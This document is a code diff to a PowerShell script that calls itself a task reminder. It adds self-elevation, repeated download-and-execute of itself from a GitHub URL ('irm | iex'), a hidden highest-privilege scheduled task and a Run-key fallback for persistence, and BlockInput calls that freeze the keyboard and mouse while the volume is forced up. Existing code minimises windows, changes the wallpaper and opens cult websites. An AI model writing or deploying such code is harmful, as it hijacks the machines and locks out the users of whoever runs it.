@@ -1,5 +1,6 @@
 # ================= CONFIG =================
-$BaseUrl = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
+$BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
+$ScriptUrl = "$BaseUrl/reminders.ps1"   # must match this script's filename in the repo
 
 $Sites = @{
     1 = "https://heavensgate.com/"
@@ -9,6 +10,7 @@ $Sites = @{
     5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
 }
 
+
 $MinSeconds      = 10
 $MaxSeconds      = 120
 $Volume          = 0.5    # Windows system volume during reminders (0.0 - 1.0)
@@ -17,9 +19,53 @@ $AvoidRepeat     = $true
 $MinimizeAll     = $true  # minimise all windows at each reminder
 $MaxAudioWait    = 60     # never wait longer than this (seconds) for audio to finish
 $ShowConsole     = $false # set to $true when debugging (keeps the window visible)
+
+$FreezeInput     = $true  # block keyboard/mouse while audio plays (needs admin)
+$FreezeVolume    = $true  # keep volume pinned and unmuted while audio plays
+
+$TaskName        = "TaskReminder"
+$DailyStartTime  = "08:00"  # daily start, in addition to every logon
+$LogonDelay      = "PT30S"  # wait after login so the network is up
 # ==========================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# ---- Elevation (needed for input blocking and the highest-privilege task) ----
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$PsExe   = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+$RunCmd  = "irm '$ScriptUrl' | iex"
+
+if (-not $isAdmin) {
+    # One UAC prompt; relaunch this script elevated and exit this copy
+    Start-Process $PsExe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$RunCmd`""
+    exit
+}
+
+# ---- Autostart: scheduled task (every logon + daily). Created only if missing ----
+$autostartErr = $null
+try {
+    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
+        $action = New-ScheduledTaskAction -Execute $PsExe -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$RunCmd`""
+        $logon  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+        $logon.Delay = $LogonDelay
+        $daily  = New-ScheduledTaskTrigger -Daily -At $DailyStartTime
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
+                    -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew `
+                    -ExecutionTimeLimit ([TimeSpan]::Zero)
+        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($logon, $daily) `
+            -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null
+    }
+} catch {
+    $autostartErr = $_.Exception.Message
+    # Fallback: HKCU Run key (starts non-elevated, so it will show a UAC prompt each login)
+    try {
+        $cmd = "`"$PsExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$RunCmd`""
+        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value $cmd -ErrorAction Stop
+        $autostartErr += " (fell back to HKCU Run key)"
+    } catch { $autostartErr += " | Run key failed: $($_.Exception.Message)" }
+}
+
 $Dir = Join-Path $env:TEMP "TaskReminder"
 New-Item -ItemType Directory -Path $Dir -Force | Out-Null
 $LogFile = Join-Path $Dir "log.txt"
@@ -53,7 +99,8 @@ public class WinHide {
     } catch { Log "HIDE FAILED: $($_.Exception.Message)" }
 }
 
-Log "--- started. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion), apartment: $([Threading.Thread]::CurrentThread.GetApartmentState())"
+Log "--- started. Admin: $isAdmin, Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion), apartment: $([Threading.Thread]::CurrentThread.GetApartmentState())"
+if ($autostartErr) { Log "AUTOSTART PROBLEM: $autostartErr" }
 
 # Only one copy at a time
 $mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
@@ -92,6 +139,20 @@ public class WP {
     Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"
     $wpOk = $true
 } catch { Log "WALLPAPER SETUP FAILED: $($_.Exception.Message)" }
+
+# Input blocking support
+$lockOk = $false
+if ($FreezeInput) {
+    try {
+        Add-Type -ErrorAction Stop @"
+using System.Runtime.InteropServices;
+public class InputLock {
+    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
+}
+"@
+        $lockOk = $true
+    } catch { Log "INPUT LOCK SETUP FAILED: $($_.Exception.Message)" }
+}
 
 # System volume support (Windows Core Audio)
 $volOk = $false
@@ -215,7 +276,30 @@ while ($true) {
             }
         } catch { Log "AUDIO FAILED: $($_.Exception.Message)" }
     }
-    if ($waitMs -gt 0) { Start-Sleep -Milliseconds $waitMs }
+
+    if ($waitMs -gt 0) {
+        # Freeze keyboard/mouse for the length of the audio
+        $locked = $false
+        if ($FreezeInput -and $lockOk) {
+            try { $locked = [InputLock]::BlockInput($true); Log "Input blocked: $locked" }
+            catch { Log "BLOCK FAILED: $($_.Exception.Message)" }
+        }
+        try {
+            $end = (Get-Date).AddMilliseconds($waitMs)
+            while ((Get-Date) -lt $end) {
+                # keep volume pinned and unmuted, even if changed from a headset, mixer, etc.
+                if ($FreezeVolume -and $volOk) {
+                    try {
+                        if ([SysVol]::Mute) { [SysVol]::Mute = $false }
+                        if ([math]::Abs([SysVol]::Volume - $Volume) -gt 0.01) { [SysVol]::Volume = [single]$Volume }
+                    } catch {}
+                }
+                Start-Sleep -Milliseconds 100
+            }
+        } finally {
+            if ($locked) { [void][InputLock]::BlockInput($false); Log "Input unblocked" }
+        }
+    }
 
     # 4. Open the website after the audio has finished
     try { Start-Process $Sites[$x] -ErrorAction Stop }
